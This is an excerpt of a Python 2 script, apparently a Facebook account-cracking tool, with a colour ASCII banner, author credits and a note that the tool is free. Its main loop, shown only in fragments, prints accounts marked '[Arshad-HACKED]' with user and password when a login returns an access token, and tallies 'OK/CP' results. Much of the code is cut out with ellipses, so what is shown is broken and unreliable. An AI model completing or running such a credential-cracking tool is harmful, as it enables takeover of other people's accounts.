#Tools Created By Arshad Ahmed Topu
...
\033[0;94m        
         ...
         \033[0;94m   _____   _____ _    _          _____  

    \033[0;94m   /\   |  __ \ / ____| |  | |   /\   |  __ \ 

    \033[0;96m  /  \  | |__) | (___ | |__| |  /  \  | |  | |

   \033[0;96m  / /\ \ |  _  / \___ \|  __  | / /\ \ | |  | |

  \033[0;96m / ____ \| | \ \ ____) | |  | |/ ____ \| |__| |

 \033[0;96m/_/    \_\_|  \_\_____/|_|  |_/_/    \_\_____/ 
...
print("\033[0;91mThis Tool's Free By Arshad Ahmed Topu")
...
def menu():
    ...
    print '\033[0;93mAUTHOR   : Arshad Ahmed Topu'

    print '\033[0;94mFACEBOOK : Arshad Ahmed Topu'

    print '\033[0;96mGITHUB   : arshad-10'
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Arshad-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
    ...
    '[\xe2\x9c\x93] Arshad OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
